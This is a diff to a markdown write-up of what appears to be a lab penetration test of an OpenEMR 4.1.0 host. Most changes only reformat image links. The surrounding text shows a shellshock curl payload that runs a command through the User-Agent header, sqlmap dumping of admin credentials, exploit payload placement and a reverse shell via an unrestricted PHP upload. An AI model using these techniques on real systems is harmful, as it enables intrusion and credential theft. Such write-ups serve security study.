@@ -149,18 +149,18 @@ This directory can only be viewed from localhost.
 ```
 
 - most of the folder is access denied, some of them is only access by localhost
-![[Pasted image 20210510112654.png]]
+![](Pasted%20image%2020210510112654.png)
 - Tried socat, but seems not work.
 ```bash
 └─$ socat TCP-LISTEN:80,fork,reuseaddr TCP:192.168.59.159:80 &
 [1] 12321
 ```
-![[Pasted image 20210510113213.png]]
+![](Pasted%20image%2020210510113213.png)
 - not working even after I changed my /etc/hosts to make target box localhost.
-![[Pasted image 20210510114218.png]]
+![](Pasted%20image%2020210510114218.png)
 
 - nikto remind us that there might be shellshock vulnerability, but seems not work either.
-![[Pasted image 20210510114946.png]]
+![](Pasted%20image%2020210510114946.png)
 ```bash
 └─$ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://192.168.59.159/cgi-bin/test.cgi
 <b>Date: Mon May 10 03:01:09 2021</b><br>
@@ -224,7 +224,9 @@ Target: http://192.168.59.159/
 Task Completed
 ```
 - We have OpenEMR
-![[Pasted image 20210510172840.png]]# OpenEMR
+![](Pasted%20image%2020210510172840.png)
+
+# OpenEMR
 ```bash
 ┌──(htb㉿kali)-[/usr/…/wordlists/seclists/Discovery/Web-Content]
 └─$ searchsploit openemr 4.1.0
@@ -532,7 +534,7 @@ Table: users
 ```
 - DB test is empty.
 - sqlmap is still cracking further users' password (cancelled by me), but I don't think that's necessary since we had already have the user admin's credential. And successfully login.
-![[Pasted image 20210510180325.png]]
+![](Pasted%20image%2020210510180325.png)
 - Tried to use the exploit python script do the job, but always got this error:
 ```bash
 Traceback (most recent call last):
@@ -557,9 +559,9 @@ Traceback (most recent call last):
 AttributeError: 'str' object has no attribute 'encoding'
 ```
 - So I have to study it for manual hacking. Since in script 'form284' is for payload, I located form283 and form285.
-![[Pasted image 20210510183624.png]]
+![](Pasted%20image%2020210510183624.png)
 - According to the context here, we can locate that the form284 is the **Hylafax Server**:
-![[Pasted image 20210510183717.png]]
+![](Pasted%20image%2020210510183717.png)
 - So we put our payload in here:
 ```bash
 ┌──(htb㉿kali)-[/tmp]
@@ -572,11 +574,13 @@ http://192.168.59.159/openemr/interface/main/daemon_frame.php
 
 -------------------------------------------
 - There's another way to get reverse shell, with openEMR administration menu > other menu item, user admin has the ability to edit files.
-![[Pasted image 20210511114541.png]]
+![](Pasted%20image%2020210511114541.png)
 - By testing it can upload any file without check extension, anyway, my php file is successfully uploaded, the only trick is, it wouold put the file to images folder, the path to access it would be:
 http://192.168.59.159/openemr/sites/default/images/
-![[Pasted image 20210511114851.png]]
-![[Pasted image 20210511114952.png]]# Privesc
+![](Pasted%20image%2020210511114851.png)
+![](Pasted%20image%2020210511114952.png)
+
+# Privesc
 ## Reconn
 ```bash
 bash-4.1$ id
